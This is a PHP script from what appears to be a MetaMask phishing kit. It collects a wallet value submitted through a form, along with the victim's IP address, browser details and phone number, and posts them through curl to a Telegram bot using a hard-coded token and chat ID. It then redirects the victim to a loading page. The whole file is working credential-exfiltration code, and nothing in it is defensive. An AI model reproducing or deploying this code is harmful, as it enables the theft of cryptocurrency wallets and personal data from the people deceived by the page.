<?php

session_start();
$_SESSION['phone']     = $_POST['phone'];
$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);

$ip = getenv("REMOTE_ADDR");
$message = "--------------Metamask wallet-----------------------\n";
$message .= "wallet           	: ".$_POST['example']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "IP      :www.geoiptool.com/?IP=$ip\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "|----------- unknown --------------|\n";
$cc = $_POST['ccn'];
$botToken="5688567304:AAFR4Hw8TIftNBm-pDjew9OSVPx4r4ztNOc";

    $website="https://api.telegram.org/bot".$botToken;
    $chatId=5625277327;  //** ===>>>NOTE: this chatId MUST be the chat_id of a person, NOT another bot chatId !!!**
    $params=[
        'chat_id'=>$chatId, 
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

header('Location:loading1.php');?>